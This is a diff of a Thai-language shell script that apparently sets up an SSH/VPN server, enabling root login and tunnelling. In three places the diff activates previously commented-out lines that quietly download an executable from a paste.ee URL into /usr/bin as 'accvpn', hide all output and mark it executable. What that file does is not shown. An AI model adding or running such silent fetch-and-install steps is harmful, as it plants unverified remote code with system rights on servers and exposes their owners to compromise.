@@ -7,9 +7,9 @@ echo "Otaku Mystery" > squidcre
 squidcre=$(cat squidcre)
 if grep -i otaku squidban 1>/dev/null 2>/dev/null ; then
 echo -e "\033[1;33m- - - - -> \033[01;34mสร้างเเละจัดทำโดย @"$squidfail"\033[01;33m $squidcre\033[0m"
-else
+else ###########
 echo "ไม่สามารถติดตั้งได้"
-exit
+exit ##########
 fi
 cat -n /etc/issue |grep 1 |cut -d' ' -f6,7,8 |sed 's/1//' |sed 's/	//' > /etc/so 
 echo -e "\033[1;33m- - - - -> \033[01;34mทำงานบนระบบ:\033[0m $(cat /etc/so)"
@@ -53,11 +53,11 @@ echo "Port 22" >> /etc/ssh/sshd_config
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "PermitTunnel yes" >> /etc/ssh/sshd_config
 
-#echo "UseDns no" >> /etc/ssh/sshd_config
-#cd /usr/bin
-#wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
-#chmod +x accvpn
-#cd
+echo "UseDns no" >> /etc/ssh/sshd_config
+cd /usr/bin
+wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
+chmod +x accvpn
+cd
 
 service ssh restart 1> /dev/null 2> /dev/null
 
@@ -137,11 +137,11 @@ echo "Port 22" >> /etc/ssh/sshd_config
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "PermitTunnel yes" >> /etc/ssh/sshd_config
 
-#echo "UseDns no" >> /etc/ssh/sshd_config
-#cd /usr/bin
-#wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
-#chmod +x accvpn
-#cd
+echo "UseDns no" >> /etc/ssh/sshd_config
+cd /usr/bin
+wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
+chmod +x accvpn
+cd
 
 service ssh restart 1> /dev/null 2> /dev/null
 
@@ -220,11 +220,11 @@ echo "Port 22" >> /etc/ssh/sshd_config
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "PermitTunnel yes" >> /etc/ssh/sshd_config
 
-#echo "UseDns no" >> /etc/ssh/sshd_config
-####cd /usr/bin
-###wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
-##chmod +x accvpn
-#cd
+echo "UseDns no" >> /etc/ssh/sshd_config
+cd /usr/bin
+wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
+chmod +x accvpn
+cd
 
 service sshd restart 1> /dev/null 2> /dev/null
 
